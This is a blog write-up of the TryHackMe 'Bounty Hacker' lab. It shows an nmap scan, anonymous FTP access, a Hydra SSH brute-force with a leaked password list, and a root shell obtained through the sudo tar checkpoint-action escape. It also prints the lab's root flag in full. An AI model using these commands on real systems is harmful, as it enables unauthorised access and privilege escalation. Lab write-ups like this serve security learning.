---
published: true
image: /assets/img/sample/bounty_hacker_wirteup/boundy.png
categories:
  - Writeup
  - TryHackMe
tags:
  - tryhackme
---


Today I wanna share for you a very easy fun box in [Tryhackme](https://tryhackme.com/) called [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) created by [Sevuhl](https://tryhackme.com/p/Sevuhl)

# [](#header-2)Nmap Scan

```console
# Nmap 7.80 scan initiated Fri Jul 31 19:53:29 2020 as: nmap -sC -sV -oN nmap 10.10.85.90
Nmap scan report for 10.10.85.90
Host is up (0.29s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.69.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 31 19:54:25 2020 -- 1 IP address (1 host up) scanned in 56.02 seconds

```
# [](#header-2)Web

![Desktop View](/assets/img/sample/bounty_hacker_wirteup/2.png)

I scanned all directories, but nothing interesting there ,let's move on 

# [](#header-2)FTP

Next step is FTP can login with anonymous 

```console
┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
└──╼ #ftp 10.10.85.90
Connected to 10.10.85.90.
220 (vsFTPd 3.0.3)
Name (10.10.85.90:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
`ls -al` 

```console
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> 

```
Let's download these two files with `get` command

```console
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (402.1706 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (35.0984 kB/s)
ftp> 

```

`task.txt`

```console
┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
└──╼ #cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

`locks.txt`

```console
┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
└──╼ #cat locks.txt 
rEddrAGON
ReDdr*****d!cat3
Dr@gO*****cat3
R3DDr*****YndIC@Te
Re****0N
R3d*****1c4te
dRa****DiCATE
ReDD*****Ic4te
R3D****44
RedD*****1cat3
R3dD*****d1c@T3
Synd*****@g0n
re****Ag0N
REddR*****NdIc47e
Dra6******IC@t3
4L1mi*****eB357
rEDd******1c473
DrAg****D1cATE
ReD*****nd1cate
Dr@g*****1C4Te
RedDr*****9ic47e
REd*****7e
dr******c@73
rEDdr******iCat3
r3d****0N
Re****1ca7e

```

Look like `passowrd` file. According to `task.txt` file `lin` can be username 

So let's bruteforce with hydra for ssh :)

```console
┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
└──╼ #hydra -l lin -P locks.txt ssh://10.10.85.90
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-31 20:17:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.85.90:22/
[22][ssh] host: 10.10.85.90   login: lin   password: RedD*******nd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-31 20:17:40
```

OK! Now we got username and password , let's login

```console
┌─[root@cyb3rhoL1c]─[~/Desktop/tryhackme/machine/bounty_hacker]
└──╼ #ssh lin@10.10.85.90
lin@10.10.85.90's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Fri Jul 31 09:59:59 2020 from 10.8.69.162
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR**************T3}

```

# [](#header-2)Privilege Escalation

```console
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

`lin` user can run `tar` as root ,let's go [GTFObin](https://gtfobins.github.io/) and search `tar`

![Desktop View](/assets/img/sample/bounty_hacker_wirteup/3.png)

Now we use this command for privilege escalation

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

```console
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
# 
```

We owned this machine :)

![Desktop View](/assets/img/sample/bounty_hacker_wirteup/4.png)

[Enjoy..]()

<script src="https://tryhackme.com/badge/97569"></script>
